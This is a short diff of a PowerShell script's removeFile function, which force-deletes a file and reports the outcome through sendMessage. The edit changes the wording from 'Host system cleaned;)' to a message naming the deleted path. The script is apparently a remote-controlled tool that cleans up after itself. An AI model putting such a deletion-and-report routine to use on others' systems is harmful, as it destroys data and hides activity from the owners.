@@ -161,12 +161,12 @@ function removeFile {
     if (Test-Path $path) {
     
         Remove-Item -Path "$path" -Force
-        $message = "Host system cleaned;)"
+        $message = "File at $path deleted;);)"
         sendMessage($message)
     
     }
     else {
-        $message = "I was not able to clean the host system....What happened?"
+        $message = "I was not able to remove the file at $path....What happened?"
         sendMessage($message)
     }
         
